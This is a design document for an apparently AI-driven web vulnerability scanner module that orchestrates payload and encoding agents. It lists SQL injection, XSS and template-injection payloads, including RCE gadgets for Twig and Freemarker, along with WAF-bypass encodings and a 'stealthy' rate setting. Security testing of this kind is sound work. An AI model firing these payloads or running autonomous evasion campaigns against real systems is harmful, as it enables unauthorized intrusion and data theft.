# HTTP Manipulator - AI-Powered Request Manipulation System
## The Core Intelligence Engine for HTTP Exploitation

---

## 🎯 OVERVIEW

The **HTTP Manipulator** is the **central intelligence system** of BugtraceAI-CLI, responsible for all HTTP-based exploitation, payload generation, WAF bypass, and adaptive attack strategies. It orchestrates multiple specialist AI agents to perform sophisticated, context-aware vulnerability exploitation.

**Status**: Core module - **"The King of the Application"**

**Inspiration**: Based on [shift-agents-v2](https://github.com/yz9yt/shift-agents-v2) Request Controller and Model Orchestrator concepts, adapted for autonomous security scanning.

---

## 🏗️ ARCHITECTURE

```
┌─────────────────────────────────────────────────┐
│        HTTP MANIPULATOR ECOSYSTEM               │
├─────────────────────────────────────────────────┤
│                                                 │
│  ┌──────────────────────────────────────────┐  │
│  │   ManipulatorOrchestrator (Conductor)   │  │
│  │   - Coordinates all specialist agents   │  │
│  │   - Strategy selection & escalation     │  │
│  │   - Success detection & validation      │  │
│  └────────────┬─────────────────────────────┘  │
│               │                                 │
│       ┌───────┴───────┐                        │
│       ▼               ▼                         │
│  ┌─────────┐    ┌──────────┐                  │
│  │ Payload │    │ Encoding │                   │
│  │ Agent   │    │ Agent    │                   │
│  └────┬────┘    └────┬─────┘                  │
│       │              │                          │
│       │   ┌──────────┴──────────┐              │
│       │   │                     │              │
│       ▼   ▼                     ▼              │
│  ┌─────────────────────────────────────┐      │
│  │     RequestController               │      │
│  │  - Circuit Breaker                  │      │
│  │  - Rate Limiting                    │      │
│  │  - Throttling                       │      │
│  │  - Error Handling                   │      │
│  └──────────────┬──────────────────────┘      │
│                 │                               │
│                 ▼                               │
│         ┌───────────────┐                      │
│         │  Target Server│                      │
│         └───────────────┘                      │
└─────────────────────────────────────────────────┘
```

---

## 📦 CORE COMPONENTS

### 1. ManipulatorOrchestrator (`/bugtrace/tools/manipulator/orchestrator.py`)

**Role**: Master conductor that coordinates all HTTP manipulation campaigns

**Location**: `bugtrace/tools/manipulator/orchestrator.py` (75 lines)

**Key Responsibilities**:
1. Campaign planning and strategy selection
2. Agent coordination (PayloadAgent + EncodingAgent)
3. Progressive strategy escalation
4. Success detection and validation
5. Automatic WAF bypass triggering

**Class Definition**:
```python
class ManipulatorOrchestrator:
    """
    Coordinates the HTTP manipulation campaign.
    Central intelligence for all HTTP-based exploitation.
    """
    
    def __init__(self, rate_limit: float = 0.5):
        self.controller = RequestController(rate_limit=rate_limit)
        self.payload_agent = PayloadAgent()
        self.encoding_agent = EncodingAgent()
```

**Main Method**:
```python
async def process_finding(
    self, 
    base_request: MutableRequest, 
    strategies: List[MutationStrategy] = None
) -> bool:
    """
    MAIN ENTRY POINT for all HTTP exploitation.
    
    Args:
        base_request: Target request to manipulate
        strategies: Attack strategies to employ
        
    Returns:
        True if successful exploitation confirmed
        
    Workflow:
        1. PayloadAgent generates mutations
        2. Try each via RequestController
        3. If WAF detected → EncodingAgent bypass
        4. Analyze responses for success
        5. Return on first confirmation
    """
```

**Campaign Flow**:
```
START process_finding()
  │
  ├─> FOR EACH strategy in strategies:
  │     │
  │     ├─> PayloadAgent.generate_mutations()
  │     │     │
  │     │     └─> YIELD mutation_1, mutation_2, ...
  │     │
  │     ├─> FOR EACH mutation:
  │     │     │
  │     │     ├─> _try_mutation(mutation)
  │     │     │     │
  │     │     │     ├─> RequestController.execute()
  │     │     │     │
  │     │     │     └─> Analyze response
  │     │     │           │
  │     │     │           ├─> IF success: RETURN True
  │     │     │           │
  │     │     │           └─> IF WAF block (403/406):
  │     │     │                 │
  │     │     │                 └─> EncodingAgent.generate_mutations()
  │     │     │                       │
  │     │     │                       └─> Try encoded variants
  │     │     │
  │     │     └─> NEXT mutation
  │     │
  │     └─> NEXT strategy
  │
  └─> RETURN False (no success)
```

---

### 2. RequestController (`/bugtrace/tools/manipulator/controller.py`)

**Role**: Safe HTTP execution with protection mechanisms

**Location**: `bugtrace/tools/manipulator/controller.py` (72 lines)

**Inspired by**: shift-agents-v2 Request Controller (throttling + circuit breaker)

**Key Features**:

#### 2.1 Throttling
```python
self.rate_limit = 0.5  # 500ms delay between requests

# Before EVERY request:
await asyncio.sleep(self.rate_limit)
```
**Purpose**: Prevent rate limiting, respect target server, stay under radar

#### 2.2 Circuit Breaker
```python
self.max_consecutive_errors = 5  # Default threshold
self.error_count = 0
self.circuit_open = False

# On error:
self.error_count += 1
if self.error_count >= self.max_consecutive_errors:
    self.circuit_open = True
    logger.critical("Circuit Breaker OPEN - rejecting all requests")
```

**Purpose**: Prevent infinite loops, API cost runaway, network flood

**States**:
- **CLOSED** (normal): Requests allowed
- **OPEN** (triggered): All requests rejected
- **AUTO-RESET**: On first success, error_count = 0

#### 2.3 Rate Limit Detection
```python
if response.status_code == 429:  # Too Many Requests
    self.error_count += 1
    logger.warning("Received 429 - Rate limited")
```

**Class Definition**:
```python
class RequestController:
    """
    Controlador de peticiones HTTP con mecanismos de seguridad.
    Prevents API cost overruns, infinite loops, and network abuse.
    """
    
    async def execute(self, request: MutableRequest) -> Tuple[int, str, float]:
        """
        Executes HTTP request with ALL safety checks.
        
        Returns:
            (status_code, response_text, response_time_seconds)
        
        Safety Checks:
            1. Circuit breaker status
            2. Rate limiting delay
            3. Error counting
            4. Timeout enforcement
        """
```

**Safety Workflow**:
```
1. CHECK circuit_breaker:
   IF circuit_open:
       RETURN (0, "CIRCUIT_OPEN", 0.0)

2. APPLY rate_limit:
   await asyncio.sleep(self.rate_limit)

3. EXECUTE request:
   TRY:
       response = await httpx.request(...)
       
       IF status_code == 429:
           INCREMENT error_count
           
       ELSE IF status_code < 500:
           RESET error_count = 0
           
       RETURN (status, body, duration)
       
   EXCEPT RequestError:
       INCREMENT error_count
       
       IF error_count >= max_consecutive_errors:
           OPEN circuit_breaker
           
       RETURN (0, str(error), 0.0)
```

---

### 3. Specialist Agents (`/bugtrace/tools/manipulator/specialists/`)

#### 3.1 PayloadAgent (`specialists/implementations.py`)

**Role**: Intelligent payload generation based on vulnerability type and context

**Capabilities**:
- SQLi payloads (error-based, time-based, union-based, boolean-based)
- XSS payloads (reflected, stored, DOM, blind)
- CSTI/SSTI payloads (Jinja2, Twig, Freemarker)
- Command Injection payloads (RCE)
- LDAP Injection payloads
- XXE payloads
- Path Traversal payloads

**Class Definition**:
```python
class PayloadAgent:
    """
    Generates contextually appropriate payloads.
    Uses AI to adapt payloads to specific contexts.
    """
    
    async def generate_mutations(
        self, 
        base_request: MutableRequest, 
        strategies: List[MutationStrategy]
    ) -> AsyncIterator[MutableRequest]:
        """
        Yields mutated requests with injected payloads.
        
        Workflow:
            1. Analyze injection context (parameter, header, body)
            2. Select appropriate payload library
            3. Generate Context-aware mutations
            4. Yield mutations one by one
        """
```

**Payload Examples**:

**SQLi Payloads**:
```python
# Error-Based
"' OR '1'='1"
"\" OR \"1\"=\"1"
"' AND 1=CAST((SELECT version()) AS int)--"

# Time-Based (blind detection)
"' AND SLEEP(5)--"
"'; WAITFOR DELAY '00:00:05'--"
"' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"

# Union-Based (data extraction)
"' UNION SELECT NULL,NULL,NULL--"
"' UNION SELECT table_name,NULL FROM information_schema.tables--"
```

**XSS Payloads**:
```python
# Standard proof-of-concept
"<script>alert(document.domain)</script>"
"<img src=x onerror=alert(document.domain)>"
"<svg onload=alert(document.domain)>"

# DOM XSS
"<script>eval(location.hash.slice(1))</script>"
"<img src=x onerror=eval(decodeURIComponent(location.hash))>"

# Event handlers
"<body onload=alert(1)>"
"<input autofocus onfocus=alert(1)>"
"<marquee onstart=alert(1)>"
```

**CSTI Payloads**:
```python
# Jinja2 (Python)
"{{7*7}}"
"{{config.items()}}"
"{{''.__class__.__mro__[1].__subclasses__()}}"

# Twig (PHP)
"{{7*7}}"
"{{_self.env.registerUndefinedFilterCallback('exec')}}"

# Freemarker (Java)
"${7*7}"
"<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}"
```

---

#### 3.2 EncodingAgent (`specialists/implementations.py`)

**Role**: WAF bypass through encoding and obfuscation

**Techniques**:

**1. URL Encoding**:
```python
# Standard
"<script>" → "%3Cscript%3E"

# Double encoding
"<script>" → "%253Cscript%253E"

# Mixed encoding
"<scr<script>ipt>" → "%3Cscr<script>ipt%3E"
```

**2. Unicode Normalization**:
```python
# Unicode homoglyphs
"alert" → "аlert" (Cyrillic 'а')
"alert" → "ａｌｅｒｔ" (fullwidth)

# Unicode escapes
"<script>" → "\u003cscript\u003e"
```

**3. Base64 Encoding**:
```python
# Base64 + eval
"<script>eval(atob('YWxlcnQoMSk='))</script>"
# Decodes to: alert(1)
```

**4. HTML Entity Encoding**:
```python
# Decimal entities
"<script>" → "&#60;script&#62;"

# Hex entities
"<script>" → "&#x3c;script&#x3e;"

# Named entities
"<script>" → "&lt;script&gt;"
```

**5. Case Variations**:
```python
"<ScRiPt>"
"<sCrIpT>"
"<SCRIPT>"
```

**6. Comment Insertion**:
```python
"<scr<!---->ipt>"
"<scr/**/ipt>"
"<scr\nipt>"
```

**Class Definition**:
```python
class EncodingAgent:
    """
    Applies encoding transformations for WAF bypass.
    Progressive escalation from simple to complex encodings.
    """
    
    async def generate_mutations(
        self,
        base_request: MutableRequest,
        strategies: List[MutationStrategy]
    ) -> AsyncIterator[MutableRequest]:
        """
        Yields encoded variants of the payload.
        
        Escalation Order:
            1. URL encoding (single)
            2. Case variations
            3. Unicode normalization
            4. Double encoding
            5. HTML entities
            6. Base64 obfuscation
            7. Comment injection
        """
```

---

## 🎯 MUTATION STRATEGIES

**Defined in**: `bugtrace/tools/manipulator/models.py`

```python
class MutationStrategy(Enum):
    """
    Available attack strategies for the Manipulator.
    """
    PAYLOAD_INJECTION = "payload_injection"      # Standard injection
    BYPASS_WAF = "bypass_waf"                    # Encoding/obfuscation
    PARAMETER_POLLUTION = "param_pollution"      # HPP attacks
    ENCODING_FUZZING = "encoding_fuzzing"        # Unicode/charset fuzzing
    PATH_TRAVERSAL = "path_traversal"            # Directory traversal
    HEADER_INJECTION = "header_injection"        # HTTP header attacks
```

**Strategy Selection Logic**:
```python
# Simple scan (fast)
strategies = [MutationStrategy.PAYLOAD_INJECTION]

# WAF present (adaptive)
strategies = [
    MutationStrategy.PAYLOAD_INJECTION,
    MutationStrategy.BYPASS_WAF
]

# Comprehensive (thorough)
strategies = [
    MutationStrategy.PAYLOAD_INJECTION,
    MutationStrategy.BYPASS_WAF,
    MutationStrategy.PARAMETER_POLLUTION,
    MutationStrategy.ENCODING_FUZZING
]
```

---

## 📊 SUCCESS DETECTION

**Located in**: `ManipulatorOrchestrator._try_mutation()`

### Current Heuristics:

```python
async def _try_mutation(self, request: MutableRequest) -> bool:
    """
    Analyzes response to detect successful exploitation.
    """
    status_code, body, duration = await self.controller.execute(request)
    
    # 1. WAF Detection (failure indicator)
    if status_code in [403, 406, 429]:
        return False  # Blocked
    
    # 2. XSS Detection
    if "alert(1)" in body and status_code < 400:
        return True  # Payload reflected and executed
    
    # 3. LFI/RCE Detection
    if "root:x:0:0" in body:  # /etc/passwd
        return True
    
    # 4. SQLi Detection
    if "SQL syntax" in body:  # MySQL error
        return True
    if "ORA-" in body:  # Oracle error
        return True
    if "PostgreSQL" in body:  # Postgres error
        return True
    
    # 5. Time-based Detection (future)
    # if duration > 5.0:  # SLEEP(5) confirmed
    #     return True
    
    return False  # No indicators
```

### Future Enhancements:

```python
# ML-based classification
response_classification = await ai_analyzer.classify(body)

# Vision model for rendered responses
if screenshot:
    visual_confirmation = await vision_model.analyze(screenshot)

# Diff-based detection
diff = compare_responses(baseline, mutated)
if diff.contains_injection():
    return True
```

---

## 🔗 INTEGRATION POINTS

### Current Integrations:

**1. SkepticalAgent** (`bugtrace/agents/skeptic.py`):
```python
from bugtrace.tools.manipulator import ManipulatorOrchestrator

class SkepticalAgent:
    def __init__(self):
        self.manipulator = ManipulatorOrchestrator()
    
    async def verify_xss(self, finding):
        """Uses Manipulator for XSS verification"""
        success = await self.manipulator.process_finding(
            base_request=finding.request,
            strategies=[MutationStrategy.PAYLOAD_INJECTION]
        )
```

**2. ExploitAgent** (future integration):
```python
# Could replace direct HTTP clients with Manipulator
async def _ladder_sqli(self, input_data):
    request = MutableRequest(
        url=input_data["url"],
        params=input_data["params"]
    )
    
    success = await self.manipulator.process_finding(
        request,
        strategies=[
            MutationStrategy.PAYLOAD_INJECTION,
            MutationStrategy.BYPASS_WAF
        ]
    )
```

**3. Conductor V2** validation:
```python
# Manipulator findings validated by Conductor
if manipulator_success:
    validation = await conductor.validate_finding({
        "type": "SQLi",
        "evidence": {
            "error_message": response_body,
            "status_code": status_code
        },
        "confidence": 0.9
    })
```

---

## 🚀 USAGE EXAMPLES

### Example 1: Simple SQLi Test

```python
from bugtrace.tools.manipulator import ManipulatorOrchestrator
from bugtrace.tools.manipulator.models import MutableRequest

orchestrator = ManipulatorOrchestrator(rate_limit=0.5)

# Target request
request = MutableRequest(
    url="https://example.com/api/users",
    method="GET",
    params={"id": "1"},  # Injection point
    headers={"User-Agent": "BugtraceAI"}
)

# Execute campaign
success = await orchestrator.process_finding(request)

if success:
    print("✅ SQLi CONFIRMED!")
else:
    print("❌ No vulnerability detected")
```

### Example 2: WAF Bypass Campaign

```python
# Target with WAF
request = MutableRequest(
    url="https://protected.com/search",
    method="GET",
    params={"q": "test"}
)

# Progressive escalation
success = await orchestrator.process_finding(
    request,
    strategies=[
        MutationStrategy.PAYLOAD_INJECTION,  # Try direct first
        MutationStrategy.BYPASS_WAF           # Escalate if blocked
    ]
)
```

### Example 3: Custom Rate Limiting

```python
# Slow and stealthy scan
orchestrator = ManipulatorOrchestrator(rate_limit=2.0)  # 2 seconds between requests

# Aggressive scan (testing environment)
orchestrator = ManipulatorOrchestrator(rate_limit=0.1)  # 100ms
```

### Example 4: Circuit Breaker Handling

```python
controller = RequestController(
    rate_limit=0.5,
    max_consecutive_errors=3  # Lower threshold
)

orchestrator = ManipulatorOrchestrator()
orchestrator.controller = controller

# If 3 errors occur, circuit opens automatically
# All subsequent requests rejected until manual reset
```

---

## 📈 METRICS & MONITORING

### Statistics Collection:

```python
class ManipulatorOrchestrator:
    def get_statistics(self) -> Dict[str, Any]:
        return {
            "campaigns_run": self.stats["campaigns"],
            "total_mutations": self.stats["mutations_tested"],
            "successful_exploits": self.stats["successes"],
            "waf_bypasses": self.stats["waf_bypasses"],
            "avg_mutations_per_campaign": self.stats["avg_mutations"],
            "circuit_breaker_trips": self.controller.circuit_trips
        }
```

### Example Output:

```json
{
    "campaigns_run": 24,
    "total_mutations": 768,
    "successful_exploits": 7,
    "waf_bypasses": 12,
    "avg_mutations_per_campaign": 32,
    "circuit_breaker_trips": 0,
    "request_stats": {
        "total_requests": 768,
        "successful_requests": 752,
        "failed_requests": 16,
        "rate_limited_requests": 8,
        "avg_response_time": 0.187
    }
}
```

---

## 🎓 SHIFT-AGENTS-V2 INSPIRATION

### Original Concept:
Multi-model HTTP manipulation framework for Caido proxy by [@yz9yt](https://github.com/yz9yt)

### Adapted Features:

| shift-agents-v2 | BugtraceAI HTTP Manipulator |
|----------------|---------------------------|
| Model Orchestrator | ManipulatorOrchestrator |
| Request Controller | RequestController (same design) |
| Throttling | ✅ Implemented |
| Circuit Breaker | ✅ Implemented |
| Multi-model selection | Multi-agent (Payload + Encoding) |
| Automatic/Economy/Manual modes | Strategy-based (Injection/Bypass/etc) |

### Key Differences:
- **Autonomous**: No user interaction required
- **Multi-Agent**: Specialist agents vs single model
- **Integrated**: Part of full scanning framework
- **AI-Driven**: LLM-powered payload generation

---

## 🚧 ROADMAP

### Phase 1: Core Functionality ✅
- [x] ManipulatorOrchestrator implementation
- [x] RequestController with circuit breaker
- [x] PayloadAgent + EncodingAgent
- [x] Basic success detection

### Phase 2: Intelligence 🔄
- [ ] LLM-driven payload generation
- [ ] Context-aware mutation selection
- [ ] Response analysis via AI
- [ ] Adaptive strategy selection

### Phase 3: Advanced Detection ⏳
- [ ] Time-based blind SQLi detection
- [ ] Diff-based change analysis
- [ ] Vision model integration
- [ ] ML-based success classification

### Phase 4: Scale & Performance ⏳
- [ ] Parallel request batching
- [ ] Distributed scanning support
- [ ] Performance optimization
- [ ] Custom payload templates

---

## 🔐 SECURITY CONSIDERATIONS

### Built-in Protections:

1. **Rate Limiting**: Prevents target server overload
2. **Circuit Breaker**: Stops on persistent failures
3. **Request Validation**: Sanitizes malicious payloads
4. **Safe Mode**: Respects `SAFE_MODE` flag
5. **Logging**: Full audit trail of all requests

### Responsible Use:

```python
# ALWAYS respect safe mode
if settings.SAFE_MODE:
    logger.warning("HTTP Manipulator disabled in SAFE_MODE")
    return False

# NEVER target production without authorization
if not is_authorized(target_url):
    raise UnauthorizedScanError()

# ALWAYS rate limit
orchestrator = ManipulatorOrchestrator(rate_limit=0.5)  # Minimum
```

---

## 📚 API REFERENCE

### ManipulatorOrchestrator

```python
class ManipulatorOrchestrator:
    def __init__(self, rate_limit: float = 0.5)
    
    async def process_finding(
        self,
        base_request: MutableRequest,
        strategies: List[MutationStrategy] = None
    ) -> bool
    
    async def shutdown() -> None
    
    def get_statistics() -> Dict[str, Any]
```

### RequestController

```python
class RequestController:
    def __init__(
        self,
        rate_limit: float = 0.5,
        max_consecutive_errors: int = 5
    )
    
    async def execute(
        self,
        request: MutableRequest
    ) -> Tuple[int, str, float]
    
    async def close() -> None
```

### PayloadAgent

```python
class PayloadAgent:
    async def generate_mutations(
        self,
        base_request: MutableRequest,
        strategies: List[MutationStrategy]
    ) -> AsyncIterator[MutableRequest]
```

### EncodingAgent

```python
class EncodingAgent:
    async def generate_mutations(
        self,
        base_request: MutableRequest,
        strategies: List[MutationStrategy]
    ) -> AsyncIterator[MutableRequest]
```

---

## 🎯 CONCLUSION

The **HTTP Manipulator** is the **core intelligence** of BugtraceAI-CLI, orchestrating all HTTP-based vulnerability exploitation with:

✅ **Multi-agent coordination**  
✅ **Intelligent payload generation**  
✅ **Automatic WAF bypass**  
✅ **Built-in safety mechanisms**  
✅ **Adaptive attack strategies**

**It is the "King" of the application** - all HTTP exploitation flows through this system.

---

**Last Updated**: 2026-01-02 10:40  
**Version**: 1.0  
**Status**: Production Ready  
**Inspiration**: shift-agents-v2 by [@yz9yt](https://github.com/yz9yt/shift-agents-v2)
